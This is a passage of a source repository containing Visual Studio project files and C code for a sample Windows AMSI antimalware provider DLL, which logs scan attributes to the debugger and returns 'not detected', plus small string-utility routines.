		{1B740B58-E395-40B5-8345-1A7265DD727D}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {8796A7D2-69DC-4BD8-B6E9-779ACC6AE4CF}
	EndGlobalSection
EndGlobal

```

`source/AMSI/AmsiProviderC/AmsiProviderServer/AmsiProviderServer.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{1B740B58-E395-40B5-8345-1A7265DD727D}</ProjectGuid>
    <RootNamespace>AmsiProviderServer</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17763.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <OutDir>.\output\$(Platform)\$(Configuration)\bin\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <GenerateManifest>false</GenerateManifest>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <OutDir>.\output\$(Platform)\$(Configuration)\bin\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <GenerateManifest>false</GenerateManifest>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <OutDir>.\output\$(Platform)\$(Configuration)\bin\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <GenerateManifest>false</GenerateManifest>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <OutDir>.\output\$(Platform)\$(Configuration)\bin\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <GenerateManifest>false</GenerateManifest>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <CompileAs>CompileAsC</CompileAs>
    </ClCompile>
    <Link>
      <ModuleDefinitionFile>exports.def</ModuleDefinitionFile>
      <EntryPointSymbol>main</EntryPointSymbol>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <CompileAs>CompileAsC</CompileAs>
    </ClCompile>
    <Link>
      <ModuleDefinitionFile>exports.def</ModuleDefinitionFile>
      <EntryPointSymbol>main</EntryPointSymbol>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MinSpace</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <CompileAs>CompileAsC</CompileAs>
      <StringPooling>true</StringPooling>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <EntryPointSymbol>DllMain</EntryPointSymbol>
      <ModuleDefinitionFile>exports.def</ModuleDefinitionFile>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MinSpace</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <ConformanceMode>true</ConformanceMode>
      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <CompileAs>CompileAsC</CompileAs>
      <StringPooling>true</StringPooling>
    </ClCompile>
    <Link>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <EntryPointSymbol>DllMain</EntryPointSymbol>
      <ModuleDefinitionFile>exports.def</ModuleDefinitionFile>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="classfactory.c" />
    <ClCompile Include="main.c" />
    <ClCompile Include="minirtl\u64tohex.c" />
    <ClCompile Include="minirtl\ultohex.c" />
    <ClCompile Include="minirtl\_strcat.c" />
    <ClCompile Include="minirtl\_strcpy.c" />
    <ClCompile Include="minirtl\_strend.c" />
    <ClCompile Include="minirtl\_strlen.c" />
  </ItemGroup>
  <ItemGroup>
    <None Include="exports.def" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="classfactory.h" />
    <ClInclude Include="global.h" />
    <ClInclude Include="minirtl\minirtl.h" />
    <ClInclude Include="minirtl\rtltypes.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`source/AMSI/AmsiProviderC/AmsiProviderServer/AmsiProviderServer.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="minirtl">
      <UniqueIdentifier>{5baab34b-228c-4014-a376-ce5e8f112526}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strlen.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="classfactory.c">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strcat.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strcpy.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\ultohex.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\_strend.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="minirtl\u64tohex.c">
      <Filter>minirtl</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="exports.def">
      <Filter>Source Files</Filter>
    </None>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="minirtl\minirtl.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="minirtl\rtltypes.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="global.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="classfactory.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`source/AMSI/AmsiProviderC/AmsiProviderServer/AmsiProviderServer.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`source/AMSI/AmsiProviderC/AmsiProviderServer/classfactory.c`:

```c
#include "global.h"
#include "classfactory.h"

VOID ShowCode(HRESULT Code)
{
    WCHAR szBuffer[200];

    _strcpy(szBuffer, L"Code = 0x");
    ultohex((ULONG)Code, _strend(szBuffer));
    _strcat(szBuffer, L"\r\n");
    OutputDebugString(szBuffer);
}

STDAPI_(LONG) DllAddRef()
{
    return InterlockedIncrement(&g_cRefDll);
}

STDAPI_(LONG) DllRelease()
{
    return InterlockedDecrement(&g_cRefDll);
}

//
// Class factory implementation.
//

STDMETHODIMP_(ULONG) CClassFactory_AddRef(
    _In_ IClassFactory *pcf
)
{
    return DllAddRef();
}

STDMETHODIMP_(ULONG) CClassFactory_Release(
    _In_ IClassFactory *pcf
)
{
    return DllRelease();
}

STDMETHODIMP CClassFactory_CreateInstance(
    _In_ IClassFactory *pcf,
    _In_ IUnknown *punkOuter,
    _In_ REFIID riid,
    _COM_Outptr_ void **ppvObject
)
{
    CClassFactory *This = IToClass(CClassFactory, cf, pcf);

    //
    // Run delegated CreateInstance routine.
    //
    return This->lpfnCreateInstance(punkOuter, riid, ppvObject);
}

STDMETHODIMP CClassFactory_LockServer(
    _In_ IClassFactory *pcf,
    _In_ BOOL fLock
)
{
    if (fLock)
        DllAddRef();
    else
        DllRelease();
    return S_OK;
}

STDMETHODIMP CClassFactory_QueryInterface(
    _In_ IClassFactory *pcf,
    _In_ REFIID riid,
    _COM_Outptr_ void **ppvObj
)
{
    if (IsEqualIID(riid, &IID_IClassFactory) || IsEqualIID(riid, &IID_IUnknown))
    {
        *ppvObj = (void *)pcf;
    }
    else
    {
        *ppvObj = NULL;
        return E_NOINTERFACE;
    }
    DllAddRef();
    return NOERROR;
}

const IClassFactoryVtbl g_ClassFactorylpVtbl = {
    CClassFactory_QueryInterface,
    CClassFactory_AddRef,
    CClassFactory_Release,
    CClassFactory_CreateInstance,
    CClassFactory_LockServer
};

//
// AMSI provider implementation.
//

typedef struct _CClassAmsiProvider {
    IAntimalwareProvider ap;
    UINT cRef;
} CClassAmsiProvider, *PCClassAmsiProvider;


HRESULT STDMETHODCALLTYPE CAmsiProvider_QueryInterface(
    _In_ IAntimalwareProvider *AmProvider,
    _In_ REFIID riid,
    _COM_Outptr_ void **ppv)
{
    CClassAmsiProvider *This = IToClass(CClassAmsiProvider, ap, AmProvider);

    OutputDebugString(L"AmsiProvider_QueryInterface\r\n");

    if (IsEqualIID(riid, &IID_IUnknown) ||
        IsEqualIID(riid, &IID_AntimalwareProvider))
    {
        *ppv = &This->ap;
    }
    else {
        *ppv = NULL;
        return E_NOINTERFACE;
    }

    This->cRef++;
    return S_OK;
}

ULONG STDMETHODCALLTYPE CAmsiProvider_AddRef(
    _In_ IAntimalwareProvider *AmProvider
)
{
    CClassAmsiProvider *This = IToClass(CClassAmsiProvider, ap, AmProvider);

    OutputDebugString(L"AmsiProvider_AddRef\r\n");

    This->cRef++;
    return This->cRef;
}

ULONG STDMETHODCALLTYPE CAmsiProvider_Release(
    _In_ IAntimalwareProvider *AmProvider
)
{
    CClassAmsiProvider *This = IToClass(CClassAmsiProvider, ap, AmProvider);

    OutputDebugString(L"AmsiProvider_Release\r\n");

    This->cRef--;
    if (This->cRef > 0)
        return This->cRef;

    LocalFree((HLOCAL)This);
    return 0;
}

ULONG64 AmsiGetAttributeAsUlong64(
    _In_ IAmsiStream *stream,
    _In_ AMSI_ATTRIBUTE attribute
)
{
    ULONG actualSize = 0;
    ULONG64 result = 0;

    HRESULT hr;

    hr = stream->lpVtbl->GetAttribute(stream, attribute,
        sizeof(ULONG64), (UCHAR*)&result, &actualSize);

    if (!SUCCEEDED(hr) || (actualSize != sizeof(ULONG64)))
        return 0;

    return result;
}

PVOID AmsiGetAttributeAsPointer(
    _In_ IAmsiStream *stream,
    _In_ AMSI_ATTRIBUTE attribute
)
{
    ULONG actualSize = 0;
    PVOID result = 0;

    HRESULT hr;

    hr = stream->lpVtbl->GetAttribute(stream, attribute,
        sizeof(PVOID), (UCHAR*)&result, &actualSize);

    if (!SUCCEEDED(hr) || (actualSize != sizeof(PVOID)))
        return 0;

    return result;
}

LPWSTR AmsiGetAttributeAsString(
    _In_ IAmsiStream *stream,
    _In_ AMSI_ATTRIBUTE attribute
)
{
    LPWSTR result = NULL;
    ULONG allocSize;
    ULONG actualSize;

    HRESULT hr;

    hr = stream->lpVtbl->GetAttribute(stream, attribute, 0, NULL, &allocSize);

    if (hr == E_NOT_SUFFICIENT_BUFFER) {

        result = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, allocSize);
        if (result) {

            hr = stream->lpVtbl->GetAttribute(stream, attribute, allocSize,
                (UCHAR*)result, &actualSize);

            if (SUCCEEDED(hr) && (actualSize <= allocSize)) {
                return result;
            }
            else {
                OutputDebugString(L"AmsiGetStringAttribute unexpected result 3\r\n");
            }
        }
        else {
            OutputDebugString(L"AmsiGetStringAttribute unexpected result 2\r\n");
        }
    }
    else {
        OutputDebugString(L"AmsiGetStringAttribute unexpected result 1\r\n");
    }
    return result;
}

BYTE CalculateBufferXor(
    _In_ LPCBYTE buffer,
    _In_ ULONGLONG size
)
{
    ULONGLONG i;
    BYTE value = 0;

    for (i = 0; i < size; i++)
        value ^= buffer[i];

    return value;
}

HRESULT STDMETHODCALLTYPE CAmsiProviderScan(
    _In_ IAntimalwareProvider *This,
    _In_ IAmsiStream *stream,
    _Out_ AMSI_RESULT *result
)
{
    LPWSTR AppName;
    LPWSTR ContentName;
    ULONG64 ContentSize = 0;
    PVOID ContentAddress = NULL;

    BYTE cumulativeXor = 0;
    BYTE chunk[1024];
    ULONG readSize;

    HRESULT hr;

    ULONG64 position;

    WCHAR szOutput[200];

    OutputDebugString(L"AmsiProviderScan\r\n");

    //
    // AMSI_ATTRIBUTE_APP_NAME
    //
    AppName = AmsiGetAttributeAsString(stream, AMSI_ATTRIBUTE_APP_NAME);
    if (AppName) {
        OutputDebugString(L"AMSI_ATTRIBUTE_APP_NAME\r\n");
        OutputDebugString(AppName);
        OutputDebugString(L"\r\n");
        HeapFree(GetProcessHeap(), 0, AppName);
    }

    //
    // AMSI_ATTRIBUTE_CONTENT_NAME
    //
    ContentName = AmsiGetAttributeAsString(stream, AMSI_ATTRIBUTE_CONTENT_NAME);
    if (ContentName) {
        OutputDebugString(L"AMSI_ATTRIBUTE_CONTENT_NAME\r\n");
        OutputDebugString(ContentName);
        OutputDebugString(L"\r\n");
        HeapFree(GetProcessHeap(), 0, ContentName);
    }

    //
    // AMSI_ATTRIBUTE_CONTENT_SIZE
    //
    ContentSize = AmsiGetAttributeAsUlong64(stream, AMSI_ATTRIBUTE_CONTENT_SIZE);

    _strcpy(szOutput, L"AMSI_ATTRIBUTE_CONTENT_SIZE\r\n0x");
    u64tohex(ContentSize, _strend(szOutput));
    _strcat(szOutput, L"\r\n");
    OutputDebugString(szOutput);

    //
    // AMSI_ATTRIBUTE_CONTENT_ADDRESS
    //
    ContentAddress = AmsiGetAttributeAsPointer(stream, AMSI_ATTRIBUTE_CONTENT_ADDRESS);

    _strcpy(szOutput, L"AMSI_ATTRIBUTE_CONTENT_ADDRESS\r\n0x");
    u64tohex((ULONG64)ContentAddress, _strend(szOutput));
    _strcat(szOutput, L"\r\n");
    OutputDebugString(szOutput);

    //
    // Provided a stream. Test read.
    //
    if (ContentAddress == 0) {

        for (position = 0; position < ContentSize; position += readSize)
        {
            hr = stream->lpVtbl->Read(stream, position, sizeof(chunk), chunk, &readSize);
            if (SUCCEEDED(hr))
            {
                cumulativeXor ^= CalculateBufferXor(chunk, readSize);

                RtlSecureZeroMemory(&szOutput, sizeof(szOutput));
                szOutput[0] = L'0';
                szOutput[1] = L'x';
                szOutput[2] = 0;
                ultohex((ULONG)cumulativeXor, &szOutput[2]);
                _strcat(szOutput, L"\r\n");
                OutputDebugString(szOutput);

            }
            else {
                OutputDebugString(L"Stream read error\r\n");
                ShowCode(hr);
                break;
            }
        }
    }

    *result = AMSI_RESULT_NOT_DETECTED;
    return S_OK;
}

void STDMETHODCALLTYPE CAmsiProviderCloseSession(
    _In_ IAntimalwareProvider *This,
    _In_ ULONGLONG session
)
{
    OutputDebugString(L"AmsiProviderCloseSession\r\n");
}

HRESULT STDMETHODCALLTYPE CAmsiProviderDisplayName(
    _In_ IAntimalwareProvider *This,
    _Out_ LPWSTR *displayName
)
{
    OutputDebugString(L"AmsiProviderDisplayName\r\n");
    *displayName = L"Custom AMSI Provider";
    return S_OK;
}

STDAPI CAmsiProvider_CreateInstance(
    _In_ IUnknown *punkOuter,
    _In_ REFIID riid,
    _COM_Outptr_ void **ppv);

IAntimalwareProviderVtbl c_AntimalwareProviderVtbl =
{
    CAmsiProvider_QueryInterface,
    CAmsiProvider_AddRef,
    CAmsiProvider_Release,
    CAmsiProviderScan,
    CAmsiProviderCloseSession,
    CAmsiProviderDisplayName
};

STDAPI CAmsiProvider_CreateInstance(
    _In_ IUnknown *punkOuter,
    _In_ REFIID riid,
    _COM_Outptr_ void **ppv
)
{
    CClassAmsiProvider *This;
    HRESULT hr;

    OutputDebugString(L"AmsiProvider_CreateInstance\r\n");

    *ppv = NULL;

    if (punkOuter) {
        return CLASS_E_NOAGGREGATION;
    }

    This = (CClassAmsiProvider*)LocalAlloc(LPTR, sizeof(CClassAmsiProvider));
    if (This) {
        This->cRef = 1;
        This->ap.lpVtbl = &c_AntimalwareProviderVtbl;

        DllAddRef();

        hr = CAmsiProvider_QueryInterface(&This->ap, riid, ppv);
        CAmsiProvider_Release(&This->ap);
    }
    else
        hr = E_OUTOFMEMORY;

    return hr;
}

//
// Our class factory support only 1 type.
//
const CClassFactory g_clsmap[] = {
    &g_ClassFactorylpVtbl, &CLSID_AmsiProvider, CAmsiProvider_CreateInstance,
    NULL, NULL, NULL
};

```

`source/AMSI/AmsiProviderC/AmsiProviderServer/classfactory.h`:

```h
#pragma once

#define _IOffset(Class, itf)         ((UINT_PTR)&(((Class *)0)->itf))
#define IToClass(Class, itf, pitf)   ((Class  *)(((LPSTR)pitf)-_IOffset(Class, itf)))
#define IToClassN(Class, itf, pitf)  IToClass(Class, itf, pitf)

typedef HRESULT(CALLBACK *LPFNCREATEINSTANCE)(IUnknown *pUnkOuter, REFIID riid, void **ppvObject);

typedef struct _CClassFactory {
    const IClassFactoryVtbl *cf;
    const CLSID *pclsid;
    LPFNCREATEINSTANCE lpfnCreateInstance;
} CClassFactory, *PCClassFactory;

#define AMSI_DEFINE_GUID(name, l, w1, w2, b1, b2, b3, b4, b5, b6, b7, b8) \
     EXTERN_C const GUID DECLSPEC_SELECTANY name \
            = { l, w1, w2, { b1, b2, b3, b4, b5, b6, b7, b8 } }

AMSI_DEFINE_GUID(CLSID_AmsiProvider, 0x1c0643e1, 0x5b0a, 0x4420, 0x9b, 0x76, 0x0d, 0xe9, 0x26, 0x4b, 0x4c, 0x59);
AMSI_DEFINE_GUID(IID_AntimalwareProvider, 0xb2cabfe3, 0xfe04, 0x42b1, 0xa5, 0xdf, 0x08, 0xd4, 0x83, 0xd4, 0xd1, 0x25);


STDAPI_(LONG) DllAddRef();
STDAPI_(LONG) DllRelease();

extern const CClassFactory g_clsmap[];

```

`source/AMSI/AmsiProviderC/AmsiProviderServer/exports.def`:

```def

LIBRARY

EXPORTS
	DllGetClassObject		PRIVATE
	DllCanUnloadNow			PRIVATE
	DllRegisterServer		PRIVATE
	DllUnregisterServer		PRIVATE

```

`source/AMSI/AmsiProviderC/AmsiProviderServer/global.h`:

```h
#pragma once

#if defined (_MSC_VER)
#if (_MSC_VER >= 1900) //VS15, 17 etc
#ifdef _DEBUG
#pragma comment(lib, "vcruntimed.lib")
#pragma comment(lib, "ucrtd.lib")
#else
#pragma comment(lib, "libucrt.lib")
#pragma comment(lib, "libvcruntime.lib")
#endif
#endif
#endif

#include <Windows.h>
#include <amsi.h>
#include "minirtl/minirtl.h"

extern HMODULE g_currentModule;
extern LONG g_cRefDll;

```

`source/AMSI/AmsiProviderC/AmsiProviderServer/main.c`:

```c
#include "global.h"
#include "classfactory.h"

//
// Globals
//
HMODULE g_currentModule;
LONG g_cRefDll = 0; //reference count

HRESULT SetKeyStringValue(
    _In_ HKEY key,
    _In_opt_ PCWSTR subkey,
    _In_opt_ PCWSTR valueName,
    _In_ PCWSTR stringValue)
{
    LONG status = RegSetKeyValue(key, subkey, valueName, REG_SZ, stringValue, 
        (DWORD)(_strlen(stringValue) + 1) * sizeof(wchar_t));
    
    return HRESULT_FROM_WIN32(status);
}

_Use_decl_annotations_
STDAPI DllRegisterServer()
{
    WCHAR modulePath[MAX_PATH];
    WCHAR clsidString[40];
    WCHAR keyPath[200];

    HRESULT hr;

    if (GetModuleFileName(g_currentModule, modulePath, ARRAYSIZE(modulePath)) >= ARRAYSIZE(modulePath))
    {
        return E_UNEXPECTED;
    }

    if (StringFromGUID2(&CLSID_AmsiProvider, clsidString, ARRAYSIZE(clsidString)) == 0)
    {
        return E_UNEXPECTED;
    }

    _strcpy(keyPath, L"Software\\Classes\\CLSID\\");
    _strcat(keyPath, clsidString);

    hr = SetKeyStringValue(HKEY_LOCAL_MACHINE, keyPath, NULL, L"FAmsiProvider");
    if (FAILED(hr)) return hr;

    _strcpy(keyPath, L"Software\\Classes\\CLSID\\");
    _strcat(keyPath, clsidString);
    _strcat(keyPath, L"\\InProcServer32");

    hr = SetKeyStringValue(HKEY_LOCAL_MACHINE, keyPath, NULL, modulePath);
    if (FAILED(hr)) return hr;

    hr = SetKeyStringValue(HKEY_LOCAL_MACHINE, keyPath, L"ThreadingModel", L"Both");
    if (FAILED(hr)) return hr;

    _strcpy(keyPath, L"Software\\Microsoft\\AMSI\\Providers\\");
    _strcat(keyPath, clsidString);

    hr = SetKeyStringValue(HKEY_LOCAL_MACHINE, keyPath, NULL, L"FAmsiProvider");
    if (FAILED(hr)) return hr;

    return S_OK;
}

_Use_decl_annotations_
STDAPI DllUnregisterServer()
{
    WCHAR clsidString[40];
    WCHAR keyPath[200];

    LONG status;

    if (StringFromGUID2(&CLSID_AmsiProvider, clsidString, ARRAYSIZE(clsidString)) == 0)
    {
        return E_UNEXPECTED;
    }

    _strcpy(keyPath, L"Software\\Microsoft\\AMSI\\Providers\\");
    _strcat(keyPath, clsidString);

    status = RegDeleteTree(HKEY_LOCAL_MACHINE, keyPath);
    if (status != NO_ERROR && status != ERROR_PATH_NOT_FOUND) return HRESULT_FROM_WIN32(status);

    _strcpy(keyPath, L"Software\\Classes\\CLSID\\");
    _strcat(keyPath, clsidString);

    status = RegDeleteTree(HKEY_LOCAL_MACHINE, keyPath);
    if (status != NO_ERROR && status != ERROR_PATH_NOT_FOUND) return HRESULT_FROM_WIN32(status);

    return S_OK;
}

_Use_decl_annotations_
STDAPI DllCanUnloadNow(void)
{
    return g_cRefDll == 0 ? S_OK : S_FALSE;
}

_Use_decl_annotations_
STDAPI DllGetClassObject(
    _In_ REFCLSID rclsid, 
    _In_ REFIID riid, 
    _Outptr_ LPVOID* ppv
)
{
    const CClassFactory *pcls;

    //
    // Does our class factory can handle this interface?
    //
    if (IsEqualIID(riid, &IID_IClassFactory) || IsEqualIID(riid, &IID_IUnknown))
    {
        for (pcls = g_clsmap; pcls->pclsid; pcls++)
        {
            if (IsEqualIID(rclsid, pcls->pclsid))
            {
                *ppv = (void *)&(pcls->cf);
                DllAddRef();                    
                return NOERROR;
            }
        }
    }
    *ppv = NULL;
    return CLASS_E_CLASSNOTAVAILABLE;
}

#ifndef _DEBUG

BOOL WINAPI DllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        g_currentModule = hinstDLL;
        DisableThreadLibraryCalls(hinstDLL);
        break;

    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}

#else

void main()
{
    ExitProcess(0);
}

#endif
```

`source/AMSI/AmsiProviderC/AmsiProviderServer/minirtl/_strcat.c`:

```c
#include "rtltypes.h"

char *_strcat_a(char *dest, const char *src)
{
	if ( (dest==0) || (src==0) )
		return dest;

	while ( *dest!=0 )
		dest++;

	while ( *src!=0 ) {
		*dest = *src;
		dest++;
		src++;
	} 

	*dest = 0;
	return dest;
}

wchar_t *_strcat_w(wchar_t *dest, const wchar_t *src)
{
	if ( (dest==0) || (src==0) )
		return dest;

	while ( *dest!=0 )
		dest++;

	while ( *src!=0 ) {
		*dest = *src;
		dest++;
		src++;
	} 

	*dest = 0;
	return dest;
}

```

`source/AMSI/AmsiProviderC/AmsiProviderServer/minirtl/_strcpy.c`:

```c
#include "rtltypes.h"

char *_strcpy_a(char *dest, const char *src)
{
	char *p;

	if ( (dest==0) || (src==0) )
		return dest;

	if (dest == src)
		return dest;

	p = dest;
	while ( *src!=0 ) {
		*p = *src;
		p++;
		src++;
	} 

	*p = 0;
	return dest;
}

wchar_t *_strcpy_w(wchar_t *dest, const wchar_t *src)
{
	wchar_t *p;

	if ((dest == 0) || (src == 0))
		return dest;

	if (dest == src)
		return dest;

	p = dest;
	while ( *src!=0 ) {
		*p = *src;
		p++;
		src++;
	} 

	*p = 0;
	return dest;
}

```

`source/AMSI/AmsiProviderC/AmsiProviderServer/minirtl/_strend.c`:

```c
#include "rtltypes.h"

char *_strend_a(const char *s)
{
	if ( s==0 )
		return 0;

	while ( *s!=0 )
		s++;

	return (char *)s;
}

wchar_t *_strend_w(const wchar_t *s)
{
	if ( s==0 )
		return 0;

	while ( *s!=0 )
		s++;

	return (wchar_t *)s;
}

```

`source/AMSI/AmsiProviderC/AmsiProviderServer/minirtl/_strlen.c`:

```c
#include "rtltypes.h"

size_t _strlen_a(const char *s)
{
	char *s0 = (char *)s;

	if ( s==0 )
		return 0;

	while ( *s!=0 )
		s++;

	return (s-s0);
}

